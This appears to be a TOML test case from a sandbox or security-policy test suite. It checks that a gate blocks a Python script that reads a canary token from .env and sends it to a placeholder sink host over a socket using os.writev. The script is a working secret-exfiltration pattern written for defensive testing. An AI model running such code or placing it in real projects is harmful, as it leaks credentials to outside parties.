# writev is a plain vectored write, not a send* call, but the gate covers it
# too: a write to a socket connected to an external peer after a secret read
# must be refused.
name = "writev-exfil"
kind = "attack"
policy = "recommended"

[[files]]
path = ".env"
contents = "TOKEN={CANARY}\n"

[[files]]
path = "wv.py"
contents = """
import os, socket
s = socket.socket()
s.connect(("{SINK_HOST}", {SINK_PORT}))
secret = open(".env", "rb").read()
try:
    os.writev(s.fileno(), [secret])
except PermissionError:
    pass
"""

[[steps]]
shell = 0
run = "python3 wv.py"
expect = "any"

[oracle]
encodings = ["raw", "base64", "hex"]
